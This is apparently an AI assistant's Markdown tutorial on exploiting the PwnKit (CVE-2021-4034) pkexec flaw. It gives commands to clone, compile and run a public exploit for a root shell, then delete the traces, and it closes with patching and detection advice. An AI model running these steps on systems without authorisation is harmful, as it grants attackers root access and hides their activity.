Here's a full Markdown walkthrough on exploiting the **`pkexec` vulnerability (CVE-2021-4034, aka PwnKit)** ‚Äî one of the most impactful local privilege escalation vulnerabilities in recent Linux history.

---

### üìÑ `pkexec_exploit_walkthrough.md`

````markdown
# üîì Privilege Escalation via pkexec (CVE-2021-4034 - PwnKit)

> ‚ö†Ô∏è **Disclaimer**: This guide is for educational purposes and *authorized* penetration testing only. Do not attempt this on systems you do not own or have explicit written permission to test.

---

## üìå What is pkexec?

- Part of **Polkit** (formerly PolicyKit)
- Used to execute commands as another user (like `sudo`)
- Present on most Linux distributions

---

## üö® CVE-2021-4034 Overview

- **Name**: PwnKit
- **Discovered by**: Qualys
- **Affected Component**: `pkexec`
- **Impact**: Local Privilege Escalation (LPE) to root
- **Exploitable**: Without any privileges or authentication

---

## ‚úÖ Affected Systems

- Most major Linux distributions
- `pkexec` versions prior to fix in early 2022

---

## üß™ Exploit Preconditions

- Access to a shell (e.g., via Telnet, SSH, or reverse shell)
- `pkexec` is installed (check with: `which pkexec`)

---

## üîç Step 1: Check for Vulnerability

```bash
pkexec --version
````

If present, the system may be vulnerable.

Check `pkexec` file:

```bash
ls -l /usr/bin/pkexec
```

Make sure it‚Äôs owned by root and has the SUID bit:

```bash
-rwsr-xr-x 1 root root 123456 Jan 12  2021 /usr/bin/pkexec
```

---

## üß® Step 2: Download Public Exploit

### Recommended Exploit (C-based)

Clone or copy this public exploit:

```bash
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
```

Or manually copy the `exploit.c` from a trusted source like:

* [https://github.com/berdav/CVE-2021-4034/blob/main/exploit.c](https://github.com/berdav/CVE-2021-4034/blob/main/exploit.c)

---

## üîß Step 3: Compile the Exploit

```bash
gcc exploit.c -o pwnkit
chmod +x pwnkit
```

---

## üöÄ Step 4: Run the Exploit

```bash
./pwnkit
```

If successful, you‚Äôll see:

```bash
# whoami
root
```

You now have a root shell.

---

## üßº Step 5: Clean Up

Always clean up after exploitation:

```bash
rm -f ./pwnkit exploit.c
```

---

## üîí Mitigation & Patching

### How to patch:

#### For Ubuntu/Debian:

```bash
sudo apt update && sudo apt upgrade polkit
```

#### For Red Hat/CentOS:

```bash
sudo yum update polkit
```

### Temporary Workaround:

Remove SUID bit (not recommended long-term):

```bash
chmod 0755 /usr/bin/pkexec
```

---

## üõ° Detection Tips (for defenders)

* Monitor execution of `pkexec` by non-root users
* Audit logs (`/var/log/auth.log`) for unusual privilege escalations
* Use file integrity monitoring for `/usr/bin/pkexec`

---

## ‚úÖ Summary

| Key Info      | Value                            |
| ------------- | -------------------------------- |
| CVE           | CVE-2021-4034                    |
| Affected Tool | `pkexec` (part of polkit)        |
| Exploit Type  | Local Privilege Escalation (LPE) |
| Fix           | Patch `polkit` to latest version |

